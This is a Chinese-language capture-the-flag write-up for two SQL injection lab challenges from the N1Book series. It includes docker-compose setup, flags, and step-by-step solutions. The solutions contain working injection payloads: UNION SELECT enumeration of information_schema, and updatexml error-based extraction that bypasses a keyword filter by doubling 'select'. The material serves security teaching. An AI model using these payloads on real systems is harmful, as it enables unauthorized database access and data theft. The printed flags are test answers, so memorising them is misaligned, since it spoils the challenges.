## **SQL注入-1**

**题目描述:**

暂无

docker-compose.yml

```
version: '3.2'
services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest
    ports:
      - 80:80
```

**启动方式**

docker-compose up -d

**题目Flag**

n1book{union\_select\_is\_so\_cool}

**Writeup**

访问url：http://192.168.10.22/index.php?id=2-1

![](../Images/67e631305fcbacbb25e72ecd047ce75e.png)

访问url：http://192.168.10.22/index.php?id=2

![](../Images/e890aa7a88cb9b93d7da3d58cdc3f4e5.png)

两者结果相同，说明不存在数字型在注入

访问url：http://192.168.10.22/index.php?id=2'

![](../Images/85940de228896dc4cd59017fab5976ad.png)

访问url：http://192.168.10.22/index.php?id=2'%23

![](../Images/b3eea288bf7e2ba28a6831bb2fa1ab04.png)

页面重新有显示内容，说明存在字符型注入

判断字段数，有三个字段

http://192.168.10.22/index.php?id=2' order by 3%23有回显

http://192.168.10.22/index.php?id=2' order by 4%23无回显

![](../Images/41604010f87b09e5fc385152a8871ea1.png)

尝试union注入，查看回显点为2,3

访问url：http://192.168.10.22/index.php?id=-2' union select 1,2,3%23

![](../Images/a8fc2f077374d5f4f18a94c5d6ae0742.png)

尝试获取表名

```
http://192.168.10.22/index.php?id=-2' union select 1,2400,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()%23
http://192.168.10.22/index.php?id=-2' union select 1,group\_concat(table\_name),2400 from information\_schema.tables where table\_schema=database()%23
```

2,3这两处回显点，一处写payload，一处可以是任意数字

![](../Images/4aacdf7e71504e6faee394ef33f58733.png)

获取字段名

http://192.168.10.22/index.php?id=-2' union select 1,group\_concat(column\_name),2400 from information\_schema.columns where table\_schema=database() and table\_name='fl4g'%23

为fllllag

![](../Images/623c2cd10f9ff6c8a58c9ab4c0e968a5.png)

获取flag：

http://192.168.10.22/index.php?id=-2' union select 1,fllllag,2400 from fl4g%23

n1book{union\_select\_is\_so\_cool}

## **SQL注入-2**

**题目描述:**

请访问 http://127.0.0.1/login.php http://127.0.0.1/user.php

docker-compose.yml

```
version: '3.2'
services:
  web:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest
    ports:
      - 80:80
```

**启动方式**

docker-compose up -d

**题目Flag**

n1book{login\_sqli\_is\_nice}

**Writeup**

查看源代码，页面注释中有提示，在url中加入?tips=1，出现报错信息

![](../Images/b8e2927837868a1bfc4d1a3fc64a3e32.png)

访问：http://192.168.10.22/login.php?tips=1 账号输入1’密码输入1抓包

![](../Images/8a561c8604e54e347fc6b224e3869493.png)

使用报错注入时可以发现，回显正常报错

name=1'and updatexml(1,concat(0x7e,(select 1)),1)#&pass=1

![](../Images/9ae10c6d54bb9b25e3800a3de66a1743.png)

name=1'and updatexml(1,concat(0x7e,(select(1)from dual)),1)#&pass=1

回显，说明我们的sql语句被进行了某种替换，导致语法错误。

![](../Images/69ba82677985b3194fbf2076964593f9.png)

尝试

name=1'and updatexml(1,concat(0x7e,(selselectect(1)from dual)),1)#&pass=1

发现回显正常

![](../Images/83011b4751c99ed1de703ecba4e23e9a.png)

使用报错注入获取表名

name=1'and updatexml(1,concat(0x7e,(selselectect(group\_concat(table\_name))from information\_schema.tables where table\_schema=database())),1)#&pass=1

为fl4g,users

![](../Images/153556172e00d84da2ef33e459119b0e.png)

获得列名

name=1'and updatexml(1,concat(0x7e,(selselectect(group\_concat(column\_name))from information\_schema.columns where table\_name='fl4g')),1)#&pass=1

为flag

![](../Images/286a1cd87e14721e92d5492e23e609cf.png)

获得flag

name=1'and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&pass=1

为n1book{login\_sqli\_is\_nice}

![](../Images/7066fa126d149119e14e07effbc8b063.png)
